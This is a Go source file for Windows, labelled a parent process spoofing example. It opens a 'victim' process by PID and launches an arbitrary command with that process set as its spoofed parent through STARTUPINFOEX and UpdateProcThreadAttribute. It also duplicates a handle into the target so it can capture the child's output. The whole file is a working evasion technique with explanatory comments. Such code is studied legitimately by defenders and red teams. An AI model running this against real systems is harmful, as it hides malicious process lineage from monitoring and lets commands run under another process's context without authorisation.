// +build windows

// Build only for Windows
//
// Copyright (C) 2020 secfurry
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//
// Parent Process Spoofing Example
//   Attempts to run the supplied command under the targeted process ID.
//   Will grab the output from stdout/stderr from the launched process and return it.
package main

import (
	"bytes"
	"fmt"
	"io"
	"os"
	"strconv"
	"unsafe"

	"golang.org/x/sys/windows"
)

// This is out STARTUPINFOEX struct
type STARTUPINFOEX struct {
	StartupInfo   windows.StartupInfo
	AttributeList *LPPROC_THREAD_ATTRIBUTE_LIST
}

// This is our opaque LPPROC_THREAD_ATTRIBUTE_LIST struct
// This is used to allocate 48 bytes of memory easily (8*6 = 48)
type LPPROC_THREAD_ATTRIBUTE_LIST struct {
	_, _, _, _, _, _ uint64
}

func main() {
	if len(os.Args) != 3 {
		fmt.Fprintf(os.Stderr, "%s <pid> <command>", os.Args[0])
		os.Exit(1)
	}

	// Security attributes that are needed to spoof parent processes
	const requestRights = windows.PROCESS_TERMINATE | windows.SYNCHRONIZE | windows.PROCESS_QUERY_INFORMATION |
		windows.PROCESS_CREATE_PROCESS | windows.PROCESS_SUSPEND_RESUME | windows.PROCESS_DUP_HANDLE

	var (
		// Command we are going to run.
		// Taken from command line.
		command = os.Args[2] // "cmd.exe /c echo Hello-There & ping 127.0.0.1"

		// Victim process ID
		// Taken from command line.
		targetPID, _ = strconv.Atoi(os.Args[1])

		// Link and load kernel32.dll
		// kernel32.dll contains the functions we need.
		dllKernel32 = windows.NewLazySystemDLL("kernel32.dll")

		// Load the functions from kernel32.dll that we need by name.
		funcCreateProcess                     = dllKernel32.NewProc("CreateProcessW")
		funcUpdateProcThreadAttribute         = dllKernel32.NewProc("UpdateProcThreadAttribute")
		funcInitializeProcThreadAttributeList = dllKernel32.NewProc("InitializeProcThreadAttributeList")
	)

	// Get HANDLE to the target process
	//
	// MSDoc https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
	//
	targetHandle, err := windows.OpenProcess(
		requestRights,     // Security Access rights
		true,              // Inherit Handles
		uint32(targetPID), // Target Process ID
	)

	if err != nil {
		panic("OpenProcess failed: " + err.Error())
	}

	// Declare some variables to create the StartupInfoEx struct
	var (
		size                uint64
		startupInfoExtended STARTUPINFOEX
	)

	// This function ALWAYS returns an error. The only way to detect a failure is to determine
	// if the size is lower than the smallest allocation size (48 bytes).
	//
	// MSDoc https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-initializeprocthreadattributelist
	//
	funcInitializeProcThreadAttributeList.Call(
		0,                              // Initial should be NULL
		1,                              // Amount of attributes requested
		0,                              // Reserved, must be zero
		uintptr(unsafe.Pointer(&size)), // Pointer to UINT64 to store the size of memory to reserve
	)

	if size < 48 {
		panic("InitializeProcThreadAttributeList returned invalid size!")
	}

	// Allocate the memory space for the opaque struct
	startupInfoExtended.AttributeList = new(LPPROC_THREAD_ATTRIBUTE_LIST)

	// Actually allocate the memory required for the LPPROC_THREAD_ATTRIBUTE_LIST blob.
	//
	// MSDoc https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-initializeprocthreadattributelist
	//
	initResult, _, err := funcInitializeProcThreadAttributeList.Call(
		uintptr(unsafe.Pointer(startupInfoExtended.AttributeList)), // Pointer to the LPPROC_THREAD_ATTRIBUTE_LIST blob
		1,                              // Amount of attributes requested
		0,                              // Reserved, must be zero
		uintptr(unsafe.Pointer(&size)), // Pointer to UINT64 to store the size of memory that was written
	)

	if initResult == 0 {
		panic("InitializeProcThreadAttributeList failed: " + err.Error())
	}

	// Update the LPPROC_THREAD_ATTRIBUTE_LIST blob with the PROC_THREAD_ATTRIBUTE_PARENT_PROCESS attribute.
	//
	// MSDoc https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute
	//
	updateResult, _, err := funcUpdateProcThreadAttribute.Call(
		uintptr(unsafe.Pointer(startupInfoExtended.AttributeList)), // Pointer to the LPPROC_THREAD_ATTRIBUTE_LIST blob
		0,                                      // Reserved, must be zero
		0x00020000,                             // PROC_THREAD_ATTRIBUTE_PARENT_PROCESS constant
		uintptr(unsafe.Pointer(&targetHandle)), // Pointer to HANDLE of the target process
		uintptr(unsafe.Sizeof(targetHandle)),   // Size of the HANDLE
		0,                                      // Pointer to previous value, we can ignore it
		0,                                      // Pointer the size to previous value, we can ignore it
	)

	if updateResult == 0 {
		panic("UpdateProcThreadAttribute failed: " + err.Error())
	}

	// Redirecting STDOUT/STDERR to our buffer

	// Get an in-memory pipe
	// This is used since we need to operate on things backed with file HANDLES.
	// Most Golang Readers/Writers are not backed with a file HANDLE.
	// Exceptions exist for net.Conn and os.File (which is what os.Pipe returns).
	stdPipeRead, stdPipeWrite, err := os.Pipe()

	if err != nil {
		panic("os.Pipe failed: " + err.Error())
	}

	// Declare a variable to strore the duplicated handle.
	var stdPipeDuplicated windows.Handle

	// We need to call this to allow the spoofed parent to have rights to our HANDLE so the child can use it.
	//
	// MSDoc https://docs.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-duplicatehandle
	//
	err = windows.DuplicateHandle(
		windows.Handle(^uintptr(1-1)),     // HANDLE to this process
		windows.Handle(stdPipeWrite.Fd()), // HANDLE to out pipe file
		targetHandle,                      // HANDLE to the target process
		&stdPipeDuplicated,                // Pointer to the destination HANDLE
		0,                                 // Access flags, can be empty since we are just duplicating
		true,                              // Enable Inheritance (required for the child to access it)
		windows.DUPLICATE_SAME_ACCESS,     // Duplication options
	)

	if err != nil {
		panic("DuplicateHandle failed: " + err.Error())
	}

	// Add the new HANDLES to our STARTUPINFO and set the flag to inform Windows that we want to use our
	// HANDLES for Stdout/Stderr.
	startupInfoExtended.StartupInfo.StdOutput = stdPipeDuplicated
	startupInfoExtended.StartupInfo.StdErr = stdPipeDuplicated
	startupInfoExtended.StartupInfo.Flags |= windows.STARTF_USESTDHANDLES

	// Declare a variable to store the output of the file pipe.
	childOutput := new(bytes.Buffer)

	// Start a separate goroutine to read into our buffer from the pipe
	go io.Copy(childOutput, stdPipeRead)

	// Set STARTUPINFO size to match the extended size
	startupInfoExtended.StartupInfo.Cb = uint32(unsafe.Sizeof(startupInfoExtended))

	// Convert string to UTF16 Pointer
	commandPtr, err := windows.UTF16PtrFromString(command)

	if err != nil {
		panic("cannot convert command: " + err.Error())
	}

	// Declare a variable to store our resulting process info
	var procInfo windows.ProcessInformation

	// Create and start the process with out new STARTUPINFOEX struct.
	//
	// MSDoc https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw
	//
	// The CREATE_NEW_CONSOLE flag is REQUIRED when attempting to spoof a parent process as the parent may not have
	// an allocated coonsole for useage, which would cause the process to crash if it requires one.
	execResult, _, err := funcCreateProcess.Call(
		0,                                   // Application name pointer, can be NULL
		uintptr(unsafe.Pointer(commandPtr)), // Command line pointer
		0,                                   // Process SECURITY_ATTRIBUTES, can be NULL
		0,                                   // Thread SECURITY_ATTRIBUTES, can be NULL
		uintptr(1),                          // Inherit Handles, set to true
		uintptr(0x00080000|windows.CREATE_NEW_CONSOLE), // Process creation flags, the EXTENDED_STARTUPINFO_PRESENT (0x00080000) flag is required
		0, // Environment Block, can be NULL
		0, // Current working directory, can be NULL
		uintptr(unsafe.Pointer(&startupInfoExtended)), // Pointer to our STARTUPINFOEX struct
		uintptr(unsafe.Pointer(&procInfo)),            // Pointer to our PROCESS_INFORMATION struct
	)

	if execResult == 0 {
		panic("CreateProcess failed: " + err.Error())
	}

	// Print out new process info!
	fmt.Printf("Process Created!\nPID: %d\n", procInfo.ProcessId)

	// Wait for process to complete
	//
	// MSDoc https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject
	//
	waitResult, err := windows.WaitForSingleObject(
		procInfo.Process, // HANDLE to created process
		windows.INFINITE, // Timeout value (currently infinite)
	)

	if waitResult != windows.WAIT_OBJECT_0 {
		panic("WaitForSingleObject failed: " + err.Error())
	}

	// Release Resources
	stdPipeRead.Close()
	stdPipeWrite.Close()
	windows.CloseHandle(targetHandle)
	windows.CloseHandle(stdPipeDuplicated)

	// Print the resulting output
	fmt.Printf("OUTPUT: [\n%s\n]\n", childOutput)

	fmt.Println("Process complete!")
}
